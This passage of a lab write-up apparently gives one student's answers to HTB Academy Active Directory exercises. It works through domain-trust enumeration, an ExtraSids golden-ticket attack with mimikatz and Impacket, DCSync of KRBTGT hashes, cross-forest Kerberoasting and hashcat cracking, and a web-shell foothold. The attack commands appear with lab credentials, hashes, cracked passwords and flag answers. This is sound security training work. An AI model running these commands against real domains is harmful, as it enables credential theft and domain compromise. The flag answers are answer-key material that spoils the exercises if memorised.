<h3 id="why-so-trusting">Why So Trusting?</h3>
<p><strong>RDP to  with user "htb-student" and password "Academy_student_AD!". What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-283-1">1</a></span>
<span class="normal"><a href="#__codelineno-283-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-283-1"><a id="__codelineno-283-1" name="__codelineno-283-1"></a><span class="nb">Import-Module</span> <span class="n">activedirectory</span>
</span><span id="__span-283-2"><a id="__codelineno-283-2" name="__codelineno-283-2"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: LOGISTICS.INLANEFREIGHT.LOCAL,</p>
<p><strong>What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-284-1">1</a></span>
<span class="normal"><a href="#__codelineno-284-2">2</a></span>
<span class="normal"><a href="#__codelineno-284-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-284-1"><a id="__codelineno-284-1" name="__codelineno-284-1"></a><span class="c"># Same as above</span>
</span><span id="__span-284-2"><a id="__codelineno-284-2" name="__codelineno-284-2"></a><span class="nb">Import-Module</span> <span class="n">activedirectory</span>
</span><span id="__span-284-3"><a id="__codelineno-284-3" name="__codelineno-284-3"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: FREIGHTLOGISTICS.LOCAL</p>
<p><strong>What direction is this trust?</strong></p>
<p>Results: Bidirectional</p>
<p><strong>RDP to  with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!". What is the SID of the child domain?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-285-1">1</a></span>
<span class="normal"><a href="#__codelineno-285-2">2</a></span>
<span class="normal"><a href="#__codelineno-285-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-285-1"><a id="__codelineno-285-1" name="__codelineno-285-1"></a><span class="c"># As we are already in the child domain:</span>
</span><span id="__span-285-2"><a id="__codelineno-285-2" name="__codelineno-285-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-285-3"><a id="__codelineno-285-3" name="__codelineno-285-3"></a><span class="nb">Get-DomainSID</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: S-1-5-21-2806153819-209893948-922872689</p>
<p><strong>What is the SID of the Enterprise Admins group in the root domain?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-286-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-286-1"><a id="__codelineno-286-1" name="__codelineno-286-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Identity</span> <span class="s2">&quot;Enterprise Admins&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">objectsid</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: S-1-5-21-3842939050-3880317879-2865463114-519</p>
<p><strong>Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-287-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-287-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-287-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-287-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-287-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-287-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-287-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-287-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-287-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-287-10">10</a></span>
<span class="normal"><a href="#__codelineno-287-11">11</a></span>
<span class="normal"><a href="#__codelineno-287-12">12</a></span>
<span class="normal"><a href="#__codelineno-287-13">13</a></span>
<span class="normal"><a href="#__codelineno-287-14">14</a></span>
<span class="normal"><a href="#__codelineno-287-15">15</a></span>
<span class="normal"><a href="#__codelineno-287-16">16</a></span>
<span class="normal"><a href="#__codelineno-287-17">17</a></span>
<span class="normal"><a href="#__codelineno-287-18">18</a></span>
<span class="normal"><a href="#__codelineno-287-19">19</a></span>
<span class="normal"><a href="#__codelineno-287-20">20</a></span>
<span class="normal"><a href="#__codelineno-287-21">21</a></span>
<span class="normal"><a href="#__codelineno-287-22">22</a></span>
<span class="normal"><a href="#__codelineno-287-23">23</a></span>
<span class="normal"><a href="#__codelineno-287-24">24</a></span>
<span class="normal"><a href="#__codelineno-287-25">25</a></span>
<span class="normal"><a href="#__codelineno-287-26">26</a></span>
<span class="normal"><a href="#__codelineno-287-27">27</a></span>
<span class="normal"><a href="#__codelineno-287-28">28</a></span>
<span class="normal"><a href="#__codelineno-287-29">29</a></span>
<span class="normal"><a href="#__codelineno-287-30">30</a></span>
<span class="normal"><a href="#__codelineno-287-31">31</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-287-1"><a id="__codelineno-287-1" name="__codelineno-287-1"></a># The complete attack would require getting the golden tickets.
</span><span id="__span-287-2"><a id="__codelineno-287-2" name="__codelineno-287-2"></a># Step 1: get SID of the Child domain
</span><span id="__span-287-3"><a id="__codelineno-287-3" name="__codelineno-287-3"></a>Import-Module .\PowerView.ps1
</span><span id="__span-287-4"><a id="__codelineno-287-4" name="__codelineno-287-4"></a>Get-DomainSID
</span><span id="__span-287-5"><a id="__codelineno-287-5" name="__codelineno-287-5"></a># Result: S-1-5-21-2806153819-209893948-922872689
</span><span id="__span-287-6"><a id="__codelineno-287-6" name="__codelineno-287-6"></a>
</span><span id="__span-287-7"><a id="__codelineno-287-7" name="__codelineno-287-7"></a>
</span><span id="__span-287-8"><a id="__codelineno-287-8" name="__codelineno-287-8"></a># Step 2: get  KRBTGT hash for the child domain
</span><span id="__span-287-9"><a id="__codelineno-287-9" name="__codelineno-287-9"></a># Go to mimikatz.exe file in the explorer and execute as admin
</span><span id="__span-287-10"><a id="__codelineno-287-10" name="__codelineno-287-10"></a>lsadump::dcsync /user:$domain\$user
</span><span id="__span-287-11"><a id="__codelineno-287-11" name="__codelineno-287-11"></a># Result:  `9d765b482771505cbe97411065964d5f`.
</span><span id="__span-287-12"><a id="__codelineno-287-12" name="__codelineno-287-12"></a>
</span><span id="__span-287-13"><a id="__codelineno-287-13" name="__codelineno-287-13"></a># Step 3: getting the name of a target user in the child domain (does not need to exist!)
</span><span id="__span-287-14"><a id="__codelineno-287-14" name="__codelineno-287-14"></a># Result: hacker
</span><span id="__span-287-15"><a id="__codelineno-287-15" name="__codelineno-287-15"></a>
</span><span id="__span-287-16"><a id="__codelineno-287-16" name="__codelineno-287-16"></a># Step 4: getting the FQDN of the child domain. 
</span><span id="__span-287-17"><a id="__codelineno-287-17" name="__codelineno-287-17"></a># Listed above in mimikatz output
</span><span id="__span-287-18"><a id="__codelineno-287-18" name="__codelineno-287-18"></a># Result:  `LOGISTICS.INLANEFREIGHT.LOCAL`
</span><span id="__span-287-19"><a id="__codelineno-287-19" name="__codelineno-287-19"></a>
</span><span id="__span-287-20"><a id="__codelineno-287-20" name="__codelineno-287-20"></a># Step 5: getting the SID of the Enterprise Admins group of the root domain
</span><span id="__span-287-21"><a id="__codelineno-287-21" name="__codelineno-287-21"></a># Way #1:
</span><span id="__span-287-22"><a id="__codelineno-287-22" name="__codelineno-287-22"></a>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid
</span><span id="__span-287-23"><a id="__codelineno-287-23" name="__codelineno-287-23"></a># Way #2:
</span><span id="__span-287-24"><a id="__codelineno-287-24" name="__codelineno-287-24"></a>Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server &quot;INLANEFREIGHT.LOCAL&quot;
</span><span id="__span-287-25"><a id="__codelineno-287-25" name="__codelineno-287-25"></a># Result:  `S-1-5-21-3842939050-3880317879-2865463114-519`
</span><span id="__span-287-26"><a id="__codelineno-287-26" name="__codelineno-287-26"></a>
</span><span id="__span-287-27"><a id="__codelineno-287-27" name="__codelineno-287-27"></a># Step 6: the attack
</span><span id="__span-287-28"><a id="__codelineno-287-28" name="__codelineno-287-28"></a># Generate a golden ticket:
</span><span id="__span-287-29"><a id="__codelineno-287-29" name="__codelineno-287-29"></a>kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
</span><span id="__span-287-30"><a id="__codelineno-287-30" name="__codelineno-287-30"></a># Read the flag (make sure that the ticket has been created with klist)
</span><span id="__span-287-31"><a id="__codelineno-287-31" name="__codelineno-287-31"></a>cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: f@ll1ng_l1k3_d0m1no3$</p>
<p><strong>SSH to with user "htb-student" and password "HTB_@cademy_stdnt!". Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-288-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-288-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-288-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-288-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-288-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-288-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-288-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-288-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-288-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-288-10">10</a></span>
<span class="normal"><a href="#__codelineno-288-11">11</a></span>
<span class="normal"><a href="#__codelineno-288-12">12</a></span>
<span class="normal"><a href="#__codelineno-288-13">13</a></span>
<span class="normal"><a href="#__codelineno-288-14">14</a></span>
<span class="normal"><a href="#__codelineno-288-15">15</a></span>
<span class="normal"><a href="#__codelineno-288-16">16</a></span>
<span class="normal"><a href="#__codelineno-288-17">17</a></span>
<span class="normal"><a href="#__codelineno-288-18">18</a></span>
<span class="normal"><a href="#__codelineno-288-19">19</a></span>
<span class="normal"><a href="#__codelineno-288-20">20</a></span>
<span class="normal"><a href="#__codelineno-288-21">21</a></span>
<span class="normal"><a href="#__codelineno-288-22">22</a></span>
<span class="normal"><a href="#__codelineno-288-23">23</a></span>
<span class="normal"><a href="#__codelineno-288-24">24</a></span>
<span class="normal"><a href="#__codelineno-288-25">25</a></span>
<span class="normal"><a href="#__codelineno-288-26">26</a></span>
<span class="normal"><a href="#__codelineno-288-27">27</a></span>
<span class="normal"><a href="#__codelineno-288-28">28</a></span>
<span class="normal"><a href="#__codelineno-288-29">29</a></span>
<span class="normal"><a href="#__codelineno-288-30">30</a></span>
<span class="normal"><a href="#__codelineno-288-31">31</a></span>
<span class="normal"><a href="#__codelineno-288-32">32</a></span>
<span class="normal"><a href="#__codelineno-288-33">33</a></span>
<span class="normal"><a href="#__codelineno-288-34">34</a></span>
<span class="normal"><a href="#__codelineno-288-35">35</a></span>
<span class="normal"><a href="#__codelineno-288-36">36</a></span>
<span class="normal"><a href="#__codelineno-288-37">37</a></span>
<span class="normal"><a href="#__codelineno-288-38">38</a></span>
<span class="normal"><a href="#__codelineno-288-39">39</a></span>
<span class="normal"><a href="#__codelineno-288-40">40</a></span>
<span class="normal"><a href="#__codelineno-288-41">41</a></span>
<span class="normal"><a href="#__codelineno-288-42">42</a></span>
<span class="normal"><a href="#__codelineno-288-43">43</a></span>
<span class="normal"><a href="#__codelineno-288-44">44</a></span>
<span class="normal"><a href="#__codelineno-288-45">45</a></span>
<span class="normal"><a href="#__codelineno-288-46">46</a></span>
<span class="normal"><a href="#__codelineno-288-47">47</a></span>
<span class="normal"><a href="#__codelineno-288-48">48</a></span>
<span class="normal"><a href="#__codelineno-288-49">49</a></span>
<span class="normal"><a href="#__codelineno-288-50">50</a></span>
<span class="normal"><a href="#__codelineno-288-51">51</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-288-1"><a id="__codelineno-288-1" name="__codelineno-288-1"></a>#### Step 1: getting the KRBTGT hash for the child domain
</span><span id="__span-288-2"><a id="__codelineno-288-2" name="__codelineno-288-2"></a>secretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt
</span><span id="__span-288-3"><a id="__codelineno-288-3" name="__codelineno-288-3"></a>
</span><span id="__span-288-4"><a id="__codelineno-288-4" name="__codelineno-288-4"></a># Example:
</span><span id="__span-288-5"><a id="__codelineno-288-5" name="__codelineno-288-5"></a># secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
</span><span id="__span-288-6"><a id="__codelineno-288-6" name="__codelineno-288-6"></a># Enter password: HTB_@cademy_stdnt_admin!
</span><span id="__span-288-7"><a id="__codelineno-288-7" name="__codelineno-288-7"></a># Results: 9d765b482771505cbe97411065964d5f
</span><span id="__span-288-8"><a id="__codelineno-288-8" name="__codelineno-288-8"></a>#### 
</span><span id="__span-288-9"><a id="__codelineno-288-9" name="__codelineno-288-9"></a>
</span><span id="__span-288-10"><a id="__codelineno-288-10" name="__codelineno-288-10"></a>#### Step 2: getting the SID for the child domain. Obtain the SID for the domain and the RIDs for each user and group and filter out by Domain SID
</span><span id="__span-288-11"><a id="__codelineno-288-11" name="__codelineno-288-11"></a>lookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep &quot;Domain SID&quot;
</span><span id="__span-288-12"><a id="__codelineno-288-12" name="__codelineno-288-12"></a>
</span><span id="__span-288-13"><a id="__codelineno-288-13" name="__codelineno-288-13"></a># Example:
</span><span id="__span-288-14"><a id="__codelineno-288-14" name="__codelineno-288-14"></a># lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;
</span><span id="__span-288-15"><a id="__codelineno-288-15" name="__codelineno-288-15"></a># Enter password: HTB_@cademy_stdnt_admin!
</span><span id="__span-288-16"><a id="__codelineno-288-16" name="__codelineno-288-16"></a># Results:  S-1-5-21-2806153819-209893948-922872689
</span><span id="__span-288-17"><a id="__codelineno-288-17" name="__codelineno-288-17"></a>####
</span><span id="__span-288-18"><a id="__codelineno-288-18" name="__codelineno-288-18"></a>
</span><span id="__span-288-19"><a id="__codelineno-288-19" name="__codelineno-288-19"></a>#### Step 3: getting the name of a target user in the child domain (does not need to exist!)
</span><span id="__span-288-20"><a id="__codelineno-288-20" name="__codelineno-288-20"></a>hacker
</span><span id="__span-288-21"><a id="__codelineno-288-21" name="__codelineno-288-21"></a>####
</span><span id="__span-288-22"><a id="__codelineno-288-22" name="__codelineno-288-22"></a>
</span><span id="__span-288-23"><a id="__codelineno-288-23" name="__codelineno-288-23"></a>#### Step 4: getting the FQDN of the child domain.
</span><span id="__span-288-24"><a id="__codelineno-288-24" name="__codelineno-288-24"></a>logistics.inlanefreight.local
</span><span id="__span-288-25"><a id="__codelineno-288-25" name="__codelineno-288-25"></a>####
</span><span id="__span-288-26"><a id="__codelineno-288-26" name="__codelineno-288-26"></a>
</span><span id="__span-288-27"><a id="__codelineno-288-27" name="__codelineno-288-27"></a>#### Step 5: getting the SID of the Enterprise Admins group of the root domain
</span><span id="__span-288-28"><a id="__codelineno-288-28" name="__codelineno-288-28"></a>lookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep &quot;Enterprise Admins&quot;
</span><span id="__span-288-29"><a id="__codelineno-288-29" name="__codelineno-288-29"></a># Example:
</span><span id="__span-288-30"><a id="__codelineno-288-30" name="__codelineno-288-30"></a># lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep &quot;Enterprise Admins&quot;
</span><span id="__span-288-31"><a id="__codelineno-288-31" name="__codelineno-288-31"></a># Enter password: HTB_@cademy_stdnt_admin!
</span><span id="__span-288-32"><a id="__codelineno-288-32" name="__codelineno-288-32"></a># Results: 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
</span><span id="__span-288-33"><a id="__codelineno-288-33" name="__codelineno-288-33"></a>####
</span><span id="__span-288-34"><a id="__codelineno-288-34" name="__codelineno-288-34"></a>
</span><span id="__span-288-35"><a id="__codelineno-288-35" name="__codelineno-288-35"></a>#### Step 6: Generate a golden ticket 
</span><span id="__span-288-36"><a id="__codelineno-288-36" name="__codelineno-288-36"></a>ticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName
</span><span id="__span-288-37"><a id="__codelineno-288-37" name="__codelineno-288-37"></a># Example:
</span><span id="__span-288-38"><a id="__codelineno-288-38" name="__codelineno-288-38"></a># ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
</span><span id="__span-288-39"><a id="__codelineno-288-39" name="__codelineno-288-39"></a>
</span><span id="__span-288-40"><a id="__codelineno-288-40" name="__codelineno-288-40"></a># The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:
</span><span id="__span-288-41"><a id="__codelineno-288-41" name="__codelineno-288-41"></a>[*] Saving ticket in hacker.ccache
</span><span id="__span-288-42"><a id="__codelineno-288-42" name="__codelineno-288-42"></a>
</span><span id="__span-288-43"><a id="__codelineno-288-43" name="__codelineno-288-43"></a># Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
</span><span id="__span-288-44"><a id="__codelineno-288-44" name="__codelineno-288-44"></a>export KRB5CCNAME=hacker.ccache 
</span><span id="__span-288-45"><a id="__codelineno-288-45" name="__codelineno-288-45"></a>####
</span><span id="__span-288-46"><a id="__codelineno-288-46" name="__codelineno-288-46"></a>
</span><span id="__span-288-47"><a id="__codelineno-288-47" name="__codelineno-288-47"></a>#### Step 7: Accessing another user on domain
</span><span id="__span-288-48"><a id="__codelineno-288-48" name="__codelineno-288-48"></a># With one user, we will request the NTLM hash for another user
</span><span id="__span-288-49"><a id="__codelineno-288-49" name="__codelineno-288-49"></a>secretsdump.py $ControlledUsername@$hostnameController.$Parentdomain -k -no-pass -just-dc-ntlm -just-dc-user $targetUsername
</span><span id="__span-288-50"><a id="__codelineno-288-50" name="__codelineno-288-50"></a># Example:
</span><span id="__span-288-51"><a id="__codelineno-288-51" name="__codelineno-288-51"></a># secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
</span></code></pre></div></td></tr></table></div>
<p>Results: 49a074a39dd0651f647e765c2cc794c7</p>
<h3 id="breaking-down-boundaries">Breaking Down Boundaries</h3>
<p><strong>Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-289-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-289-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-289-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-289-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-289-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-289-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-289-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-289-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-289-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-289-10">10</a></span>
<span class="normal"><a href="#__codelineno-289-11">11</a></span>
<span class="normal"><a href="#__codelineno-289-12">12</a></span>
<span class="normal"><a href="#__codelineno-289-13">13</a></span>
<span class="normal"><a href="#__codelineno-289-14">14</a></span>
<span class="normal"><a href="#__codelineno-289-15">15</a></span>
<span class="normal"><a href="#__codelineno-289-16">16</a></span>
<span class="normal"><a href="#__codelineno-289-17">17</a></span>
<span class="normal"><a href="#__codelineno-289-18">18</a></span>
<span class="normal"><a href="#__codelineno-289-19">19</a></span>
<span class="normal"><a href="#__codelineno-289-20">20</a></span>
<span class="normal"><a href="#__codelineno-289-21">21</a></span>
<span class="normal"><a href="#__codelineno-289-22">22</a></span>
<span class="normal"><a href="#__codelineno-289-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-289-1"><a id="__codelineno-289-1" name="__codelineno-289-1"></a>#### Enumerating SPNs
</span><span id="__span-289-2"><a id="__codelineno-289-2" name="__codelineno-289-2"></a>Get-DomainUser -SPN -Domain $TargetDomain | select SamAccountName
</span><span id="__span-289-3"><a id="__codelineno-289-3" name="__codelineno-289-3"></a># Example:
</span><span id="__span-289-4"><a id="__codelineno-289-4" name="__codelineno-289-4"></a># Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
</span><span id="__span-289-5"><a id="__codelineno-289-5" name="__codelineno-289-5"></a># Results: mssqlsvc
</span><span id="__span-289-6"><a id="__codelineno-289-6" name="__codelineno-289-6"></a>######
</span><span id="__span-289-7"><a id="__codelineno-289-7" name="__codelineno-289-7"></a>
</span><span id="__span-289-8"><a id="__codelineno-289-8" name="__codelineno-289-8"></a>#### Getting which groups is mssqlsvc member of
</span><span id="__span-289-9"><a id="__codelineno-289-9" name="__codelineno-289-9"></a>Get-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof
</span><span id="__span-289-10"><a id="__codelineno-289-10" name="__codelineno-289-10"></a># Example:
</span><span id="__span-289-11"><a id="__codelineno-289-11" name="__codelineno-289-11"></a># Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
</span><span id="__span-289-12"><a id="__codelineno-289-12" name="__codelineno-289-12"></a># Results:  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
</span><span id="__span-289-13"><a id="__codelineno-289-13" name="__codelineno-289-13"></a>######
</span><span id="__span-289-14"><a id="__codelineno-289-14" name="__codelineno-289-14"></a>
</span><span id="__span-289-15"><a id="__codelineno-289-15" name="__codelineno-289-15"></a>#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
</span><span id="__span-289-16"><a id="__codelineno-289-16" name="__codelineno-289-16"></a>.\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap
</span><span id="__span-289-17"><a id="__codelineno-289-17" name="__codelineno-289-17"></a># Example: 
</span><span id="__span-289-18"><a id="__codelineno-289-18" name="__codelineno-289-18"></a># .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
</span><span id="__span-289-19"><a id="__codelineno-289-19" name="__codelineno-289-19"></a># Results: [the kerberos ticket]
</span><span id="__span-289-20"><a id="__codelineno-289-20" name="__codelineno-289-20"></a>####
</span><span id="__span-289-21"><a id="__codelineno-289-21" name="__codelineno-289-21"></a>
</span><span id="__span-289-22"><a id="__codelineno-289-22" name="__codelineno-289-22"></a>#### Crack it
</span><span id="__span-289-23"><a id="__codelineno-289-23" name="__codelineno-289-23"></a>hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt 
</span></code></pre></div></td></tr></table></div>
<p>Results: 1logistics</p>
<p><strong>Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-290-1">1</a></span>
<span class="normal"><a href="#__codelineno-290-2">2</a></span>
<span class="normal"><a href="#__codelineno-290-3">3</a></span>
<span class="normal"><a href="#__codelineno-290-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-290-1"><a id="__codelineno-290-1" name="__codelineno-290-1"></a>GetUserSPNs.py -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
</span><span id="__span-290-2"><a id="__codelineno-290-2" name="__codelineno-290-2"></a># Example:
</span><span id="__span-290-3"><a id="__codelineno-290-3" name="__codelineno-290-3"></a># GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
</span><span id="__span-290-4"><a id="__codelineno-290-4" name="__codelineno-290-4"></a># Enter password: transporter@4
</span></code></pre></div></td></tr></table></div>
<p>Results: sapsso</p>
<p><strong>Crack the TGS and submit the cleartext password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-291-1">1</a></span>
<span class="normal"><a href="#__codelineno-291-2">2</a></span>
<span class="normal"><a href="#__codelineno-291-3">3</a></span>
<span class="normal"><a href="#__codelineno-291-4">4</a></span>
<span class="normal"><a href="#__codelineno-291-5">5</a></span>
<span class="normal"><a href="#__codelineno-291-6">6</a></span>
<span class="normal"><a href="#__codelineno-291-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-291-1"><a id="__codelineno-291-1" name="__codelineno-291-1"></a>GetUserSPNs.py -request -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
</span><span id="__span-291-2"><a id="__codelineno-291-2" name="__codelineno-291-2"></a># Example:
</span><span id="__span-291-3"><a id="__codelineno-291-3" name="__codelineno-291-3"></a># GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
</span><span id="__span-291-4"><a id="__codelineno-291-4" name="__codelineno-291-4"></a># Enter password: transporter@4
</span><span id="__span-291-5"><a id="__codelineno-291-5" name="__codelineno-291-5"></a>
</span><span id="__span-291-6"><a id="__codelineno-291-6" name="__codelineno-291-6"></a># Cracking the sapsso TGS:
</span><span id="__span-291-7"><a id="__codelineno-291-7" name="__codelineno-291-7"></a>hashcat -m 13100 sapsso /usr/share/wordlists/rockyou.txt  
</span></code></pre></div></td></tr></table></div>
<p>Results: pabloPICASSO</p>
<p><strong>Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-292-1">1</a></span>
<span class="normal"><a href="#__codelineno-292-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-292-1"><a id="__codelineno-292-1" name="__codelineno-292-1"></a>evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO
</span><span id="__span-292-2"><a id="__codelineno-292-2" name="__codelineno-292-2"></a>cat c:\Users\Administrator\Desktop\flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: burn1ng_d0wn_th3_f0rest!</p>
<h3 id="ad-enumeration-attacks-skills-assessment-part-i">AD Enumeration &amp; Attacks - Skills Assessment Part I</h3>
<p>A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: <code>admin:My_W3bsH3ll_P@ssw0rd!</code>) in place for us to start from in the <code>/uploads</code> directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.</p>
<p>Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.</p>
<p><strong>Submit the contents of the flag.txt file on the administrator Desktop of the web server</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-293-1">1</a></span>
<span class="normal"><a href="#__codelineno-293-2">2</a></span>
<span class="normal"><a href="#__codelineno-293-3">3</a></span>
<span class="normal"><a href="#__codelineno-293-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-293-1"><a id="__codelineno-293-1" name="__codelineno-293-1"></a># Enter in http:\\$ip\uploads
</span><span id="__span-293-2"><a id="__codelineno-293-2" name="__codelineno-293-2"></a># Enter creds
</span><span id="__span-293-3"><a id="__codelineno-293-3" name="__codelineno-293-3"></a># Run in the terminal
</span><span id="__span-293-4"><a id="__codelineno-293-4" name="__codelineno-293-4"></a>type c:\Users\Administrator\Desktop\flag.txt
</span></code></pre></div></td></tr></table></div>
